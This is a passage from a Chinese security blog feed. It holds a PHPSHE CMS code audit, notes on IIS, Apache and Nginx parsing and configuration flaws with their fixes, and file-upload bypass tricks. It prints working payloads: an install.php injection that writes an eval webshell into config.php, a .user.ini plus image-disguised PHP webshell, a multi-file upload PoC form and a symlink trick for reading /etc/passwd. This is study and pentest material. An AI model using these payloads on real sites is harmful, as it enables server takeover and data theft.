class="line">            <span class="keyword">if</span> ($order_id = $db-&gt;pe_insert(<span class="string">'order'</span>, $_p_info)) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> ($info_list <span class="keyword">as</span> $v) &#123;</span><br><span class="line">                    $orderdata[<span class="string">'product_id'</span>] = $v[<span class="string">'product_id'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'product_name'</span>] = $v[<span class="string">'product_name'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'product_smoney'</span>] = $v[<span class="string">'product_smoney'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'product_num'</span>] = $v[<span class="string">'product_num'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'order_id'</span>] = $order_id;</span><br><span class="line">                    $db-&gt;pe_insert(<span class="string">'orderdata'</span>, $orderdata);</span><br><span class="line">                    <span class="comment">//更新商品库存数量</span></span><br><span class="line">                    $db-&gt;pe_update(<span class="string">'product'</span>, <span class="keyword">array</span>(<span class="string">'product_id'</span>=&gt;$v[<span class="string">'product_id'</span>]), <span class="string">"`product_num`=`product_num`-&#123;$v['product_num']&#125;"</span>);</span><br></pre></td></tr></table></figure><br>order文件最后一个功能点:pay(选择支付方式)<br>出现文件包含漏洞<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png" class title="Da4er"><br><strong>page.php</strong><br>传入参数太少，$act被强制转换，没有可以利用的点。<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png" class title="Da4er"><br><strong>product.php</strong><br>在第12~13行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info[&#39;user_ip&#39;] &#x3D; pe_ip();</span><br></pre></td></tr></table></figure><p>跟进pe_ip()后发现这个获取ip地址的函数<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png" class title="Da4er"><br>没有经过任何的过滤，存在XXF头注入。<br>第95行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_g_keyword &amp;&amp; $sqlwhere .&#x3D; &quot; and &#96;product_name&#96; like &#39;%&#123;$_g_keyword&#125;%&#39;&quot;;</span><br></pre></td></tr></table></figure><br>可以看到\$_g_keyword没有经过过滤，直接拼接到sql语句中，导致搜索型注入漏洞。</p><p><strong>user.php</strong><br>这个页面存在很多sql注入漏洞，都和前面的sql注入产生原因一样，这里不在叙述。<br>第13行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($info &#x3D; $db-&gt;pe_select(&#39;user&#39;, $_p_info))</span><br></pre></td></tr></table></figure><br>判断数据是否存在，这里存在逻辑错误，可以使用万能密码绕过，同样有返回值。<br>在这个页面中还有一个pe_dbhold()函数，我们跟进去看<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png" class title="Da4er"><br>说是数据库安全，<strong>我们经过分析发现数组的键值是不存在sql注入的，但是键名还是没有过滤，同样会导致sql注入。</strong></p><p>以上就是前台的代码分析</p><hr><p>后台代码量比较大，而且出现的漏洞和前台都是一样的原理，都是sql注入居多。<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png" class title="Da4er"><br>我们只看install.php页面存在的一个任意代码执行漏洞。<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png" class title="Da4er"><br>我们看到这个\$_p_dbpre变量是没有经过过滤的，这就导致webshell到config.php中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;install&#x2F;install.php?step&#x3D;setting</span><br><span class="line"></span><br><span class="line">pesubmit&#x3D;1&amp;dbpre&#x3D;&#39;);eval($_POST[1]);&#x2F;&#x2F;&amp;.....</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这套cms还是sql注入居多，有些意思的漏洞点有几个：install中的任意代码执行，pe_dbhold()函数检查问题，还有前台的order页面存在的一个cookie反序列化sql注入问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这套cms比较简单，没有用mvc，一些漏洞点比较简单，里面也有一些很有意思的漏洞点，适合记录一下。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Web中间件漏洞笔记(持续更新....)</title>
    <link href="https://da4er.top/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-04-08T10:08:21.000Z</published>
    <updated>2020-04-08T10:10:50.101Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><h4 id="IIS文件解析漏洞"><a href="#IIS文件解析漏洞" class="headerlink" title="IIS文件解析漏洞"></a>IIS文件解析漏洞</h4><p>IIS文件解析漏洞存在于两个版本，一个是IIS6.0的文件解析漏洞，一个是IIS7.5的文件解析漏洞，IIS7.5的文件解析漏洞原理和IIS6.0类似，均因为存在逻辑问题。</p><a id="more"></a><h5 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h5><p>一.漏洞原理<br>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误（文件目录名称为test.asp，目录中的文件会被当做asp执行；后缀名为.asp;.jpg时，当作asp文件执行），从而造成文件解析漏洞。<br>二.漏洞演示<br>现在iis服务器上写入一个<strong>1.asp;.jpg</strong></p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="This is an test image"><p>然后访问发现成功解析</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="This is an test image"><p>在服务器上创建一个1.asp目录，里面写入asp文件</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="This is an test image"><p>访问发现成功解析</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="This is an test image"><p>三.漏洞修复<br>1.对新建目录文件名进行过滤，不允许新建包含.的文件夹甚至禁止新建目录<br>2.限制上传文件的执行权限，不允许执行<br>3.过滤.asp/xm.jpg等，在httpd.ini中加入过滤规则（此方法为网络上的解决办法，但在server2003中未搜索到该文件）。<br>4.升级IIS版本</p><h5 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h5><p><strong>IIS6.0的解析漏洞同样存在于IIS 5.x的版本，而IIS7.5的畸形解析漏洞的攻击方法同样适用于IIS7.0和Nginx&lt;8.037版本。</strong><br>IIS7.5文件解析漏洞出现是因为url中只要看到后缀.php，无论存在与否均交给php处理，而php又默认开启“cgi.fix_pathinfo”,会对文件路径进行整理（<strong>从后向前判定是否存在，不存在则删减，存在则当作php文件执行</strong>。）</p><p>在Fast-CGI开启状态下，<strong>在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为php文件</strong>。</p><h4 id="IIS命令执行漏洞"><a href="#IIS命令执行漏洞" class="headerlink" title="IIS命令执行漏洞"></a>IIS命令执行漏洞</h4><p>IIS6.0命令执行漏洞，在开启WebDav服务器的情况下存在可远程执行漏洞。<br>一.漏洞原理<br>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，该漏洞可以导致远程代码执行。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="This is an test image"><p>二.漏洞复现<br>Github上的一个开源exp: <a href="https://github.com/edwardz246003/IIS_exploit">https://github.com/edwardz246003/IIS_exploit</a><br>修改IP地址未对应的目标机地址</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="This is an test image"><p>但是我没有复现成功23333…<br>三.漏洞修复<br>将IIS管理器中，web服务器扩展下，webDAV禁用，即可修复，修复后再此运行脚本，未出现弹框。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="This is an test image"><h4 id="IIS短文件名"><a href="#IIS短文件名" class="headerlink" title="IIS短文件名"></a>IIS短文件名</h4><p>参考博客：<a href="https://xz.aliyun.com/t/2318">利用windows特性猜解文件名</a><br>IIS短文件名漏洞，通过IIS短文件名机制，暴力列举短文件名，尝试猜解后台地址、敏感文件甚至直接下载对应的文件。但局限于只能猜解<strong>长文件名前6位和扩展名前3位</strong>，同时<strong>需要IIS和.net两个条件都满足</strong>。<br>一.漏洞原理<br>利用了IIS短文件名机制，即为了兼容16位MS-DOS程序，<strong>Windows为文件名较长的（计算后缀后文件名长度大于9）文件（和文件夹）生成了对应的windows 8.3 短文件名</strong>。可以通过此漏洞猜解后台地址、敏感文件等。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="This is an test image"><p>二.漏洞复现<br>尝试10.10.10.132/122<del>1**/a.asp和10.10.10.132/123</del>1/a.asp；得到不同的结果</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="This is an test image"><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="This is an test image"><p>根据不同的回显我们可以判断正在猜解的对象是文件还是文件夹。<br>三.漏洞修复<br>目前几种修复方式，可选择升级.net framework或者将在注册表<br>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlFileSystem中修改NtfsDisable8dot3NameCreation为1，但修改方法尝试多次，不易成功。<br><strong>除去上述方式，较易成功的方式为将web文件夹内容拷贝到其他区域，将原文件夹删除后，再将拷贝的文件夹移动回来</strong></p><h4 id="IIS6-0PUT上传任意文件"><a href="#IIS6-0PUT上传任意文件" class="headerlink" title="IIS6.0PUT上传任意文件"></a>IIS6.0PUT上传任意文件</h4><p>一.漏洞要求：<br>1.IIS在Web服务扩展中开启了WebDAV。<br>2.IIS配置了可以写入的权限，包括网站。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="This is an test image"><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="This is an test image"><p>二.漏洞复现<br>利用burp测试<br>1.随便请求一个页面，将GET方法改成OPTIONS后测试</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/13.png" class title="This is an test image"><p>2.利用PUT方法上传一句话<br>参考博客：<a href="https://blog.csdn.net/nzjdsds/article/details/96431844">https://blog.csdn.net/nzjdsds/article/details/96431844</a><br>三.漏洞修补<br>关闭WebDAV和写权限。</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><h4 id="文件解析问题"><a href="#文件解析问题" class="headerlink" title="文件解析问题"></a>文件解析问题</h4><p>文件解析漏洞通常和文件上传漏洞密不可分。<br>一.漏洞原理<br>因为apache解析php时，当文件的最后一个后缀php相关时，会把文件交给php处理器处理，完成结果后返回给apache，再发送给浏览器。而当一个文件以多个点分隔无法识别时，则继续向左识别。<br>例如：<br>我们上传一个1.php.aaa.x2<br>由于我们不能识别x2,aaa，Apache会从左向右判断，所以这个文件会识别成php文件执行。</p><p>二.漏洞修复<br>在配置文件中，不使用AddHandler，改用SetHandler，写好正则，就不会有解析问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “.+.php$”&gt; </span><br><span class="line">SetHandler application &#x2F;x-httpd-php </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “.+.ph(p[3457]?|t|tml).”&gt; </span><br><span class="line">Require all denied </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h4 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h4><p>一般这个漏洞不会出现。<br>一.漏洞原理<br>如果运维人员给.php后缀增加了处理器：AddHandler application/x-httpd-php .php那么，在有多个后缀的情况下，只要<strong>一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀</strong>。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。<br>二.漏洞复现<br>我们可以上传1.php.jpg，因为文件名中存在php，所以这个文件会被解析成php文件，而不是jpg文件。</p><h4 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h4><p>影响范围：2.4.0~2.4.29版本<br>一.漏洞原理<br>CRLF漏洞，根本原因就是，$在正则表达式中不仅可以匹配字符串结尾位置，也可以匹配\n或\r。所以，如果服务器写入如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;    </span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>所以我们可以上传1.php\x0A将按照php后缀进行解析，导致绕过一些服务器安全策略。<br>二.复现<br>这个漏洞只能在Linux下使用，因为1.php\x0A文件名在windows不合法，不会创建的。<br>三.漏洞修复<br>1.升级到最新版本。<br>2.或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><h4 id="Nginx配置文件错误导致的解析漏洞"><a href="#Nginx配置文件错误导致的解析漏洞" class="headerlink" title="Nginx配置文件错误导致的解析漏洞"></a>Nginx配置文件错误导致的解析漏洞</h4><p>Nginx的解析漏洞说白了就是PHP的解析漏洞，只是这个漏洞在Nginx上出现的比较多。<br>一.漏洞原理<br>涉及到的选项cgi.fix_pathinfo，默认值为1，表示开启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           &#x2F;work&#x2F;www&#x2F;test;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME    </span><br><span class="line">  $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_pass   unix:&#x2F;tmp&#x2F;php-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当攻击者访问/info.jpg/xxx.php时， Nginx将查看URL，看到它以.php结尾，并将路径传递给PHP fastcgi处理程序。<br>PHP根据URL映射，在服务器上寻找xxx.php文件，但是<strong>xxx.php不存在</strong>，又由于cgi.fix_pathinfo默认是开启的，因此PHP 会继续检查路径中存在的文件，并将多余的部分当作 PATH_INFO。接着PHP在文件系统中找到.jpg文件，<strong>而后以PHP的形式执行.jpg的内容。</strong><br>这个漏洞和Ngnix版本没有关系。<br>二.漏洞修补<br>1将cgi.fix_pathinfo设置成0。<br>2如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。<br>3或将上传存储的内容与网站分离，即站库分离。<br>4或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions = .php</p><h4 id="Nginx空字节任意代码执行漏洞"><a href="#Nginx空字节任意代码执行漏洞" class="headerlink" title="Nginx空字节任意代码执行漏洞"></a>Nginx空字节任意代码执行漏洞</h4><p>影响版本：Nginx 0.5<em>, 0.6</em>,0.7 &lt;= 0.7.65,0.8 &lt;= 0.8.37<br>一.漏洞原理<br>还是00截断问题<br>二.漏洞复现<br>上传info.jpg..php,抓包在hex选项卡打开，将jpg后面后的.的十六进制改成00.<br>三.漏洞修补<br>升级Nginx版本</p><h4 id="Nginx配置不当"><a href="#Nginx配置不当" class="headerlink" title="Nginx配置不当"></a>Nginx配置不当</h4><p>Nginx配置不当除了造成文件解析漏洞，还可能造成两种后果：1、<strong>可以进行目录遍历（或目录穿越）</strong>；2、<strong>存在CRLF注入，CRLF是”回车+换行”（rn）的简称。目录穿越将在补充内容中进行介绍。</strong><br>一.漏洞原理</p><p>查看Nginx文档，可以发现有三个表示uri的变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.$uri</span><br><span class="line">2.$document_uri</span><br><span class="line">3.$request_uri</span><br></pre></td></tr></table></figure><p>1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）</p><p>Nginx目录遍历漏洞和apache一样，属于配置方面的问题。错误的配置可能导致目录遍历与源码泄露。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="This is an test image"><p>CRLF利用了HTTP包Header与Body是用两个CRLF分隔的这一特性，通过控制HTTP消息头中的字符。若采用解码跳转，攻击者就可以注入一些恶意的换行来注入一些会话Cookie或者HTML代码。<img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="This is an test image"><br>二.漏洞复现</p><p>当autoindex on;存在时，可直接访问目录。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="This is an test image"><p>CRLF注入</p><p>开启burp，刷新页面，抓包，修改数据包。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="This is an test image"><hr><p>参考博客：</p><p><a href="https://www.anquanke.com/post/id/166616#h2-29">https://www.anquanke.com/post/id/166616#h2-29</a></p><p><a href="https://mp.weixin.qq.com/s/2rSNjMxHZjAGMmzKStF28w">https://mp.weixin.qq.com/s/2rSNjMxHZjAGMmzKStF28w</a></p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;IIS&quot;&gt;&lt;a href=&quot;#IIS&quot; class=&quot;headerlink&quot; title=&quot;IIS&quot;&gt;&lt;/a&gt;IIS&lt;/h3&gt;&lt;h4 id=&quot;IIS文件解析漏洞&quot;&gt;&lt;a href=&quot;#IIS文件解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;IIS文件解析漏洞&quot;&gt;&lt;/a&gt;IIS文件解析漏洞&lt;/h4&gt;&lt;p&gt;IIS文件解析漏洞存在于两个版本，一个是IIS6.0的文件解析漏洞，一个是IIS7.5的文件解析漏洞，IIS7.5的文件解析漏洞原理和IIS6.0类似，均因为存在逻辑问题。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件上传Trick(持续更新...)</title>
    <link href="https://da4er.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-04-08T01:07:14.000Z</published>
    <updated>2020-04-08T08:00:21.311Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只记载一些文件上传的骚操作，其他的基本操作不在叙述。<br><a id="more"></a></p><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>竞争上传原理：有些服务器采用了先保存，再删除不合法文件的方式。所以我们可以上传一个生成shell的文件，然后通过不断的访问这个文件，就会有个时间差，从而在服务器上生成一个shell。<br>操作：使用burp<br>上传生成shell的文件，发送到Intruder模块。<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="This is an test image"><br>假如我们知道了文件上传的路径，我们就可以不断访问这个，从而生成shell。<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="This is an test image"><br>设置成null payload：<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="This is an test image"><br>两个模块一块跑<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="This is an test image"><br>最后生成了shell<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="This is an test image"></p><h4 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h4><p>比较老的一个文件上传漏洞<br>原理：上传点支持多文件上传，但是却只对第一个文件做了过滤。<br>所以我们可以本地构造上传的poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name&#x3D;&quot;form&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;http:&#x2F;&#x2F;test&#x2F;upload.asp&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>第一个文件上传合法文件，第二个文件上传shell文件。</p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>PHP版本&lt;5.3.4<br>上传包中泄露了上传地址<br>php的magic_quotes_gpc为OFF状态<br><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="This is an test image"></p><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。<br>利用条件：<br>在上传文件夹中存在php可执行文件<br>主要利用了两个参数：<br><strong>auto_append_file、auto_prepend_file</strong></p><blockquote><p>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句： require(./a.jpg);<br>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有 exit() 时该设置无效）</p></blockquote><p>所以我们可以自定义一个.user.ini上传：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure><br>这个意思是在同个目录的php文件开头自动加载执行a.jpg<br>所以我们直接上传a.jpg里面包含一句话即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval(@$_REQUEST[1])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="上传黑名单"><a href="#上传黑名单" class="headerlink" title="上传黑名单"></a>上传黑名单</h4><p>在CTF中经常用的后缀名：phtml，shtml<br><strong>php由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</strong></p><h4 id="系统命名绕过"><a href="#系统命名绕过" class="headerlink" title="系统命名绕过"></a>系统命名绕过</h4><p>在Windows系统中，上传index.php. 会重命名为 . ，可以绕过后缀检查。 也可尝试 index.php%20 ， index.php:1.jpg index.php::$DATA 等。 在Linux系统中，可以尝试上传名为 index.php/. 或 ./aa/../index.php/. 的文件</p><h4 id="软链接任意读取文件"><a href="#软链接任意读取文件" class="headerlink" title="软链接任意读取文件"></a>软链接任意读取文件</h4><p>让用户上传一个 tar 压缩包 , 然后会将其中的 txt 文件的内容显示出来正解是先本地创建一个符号链接指向某一个敏感文件的绝对路径 (/etc/passwd)然后使用 tar 打包后上传给具有漏洞的程序 , 然后 , 经过程序处理以后就会 follow 符号链接将文件内容显示出来<br>参考博客：<br><a href="https://www.lizenghai.com/archives/5763.html">https://www.lizenghai.com/archives/5763.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文只记载一些文件上传的骚操作，其他的基本操作不在叙述。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>RCE学习笔记</title>
    <link href="https://da4er.top/RCE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
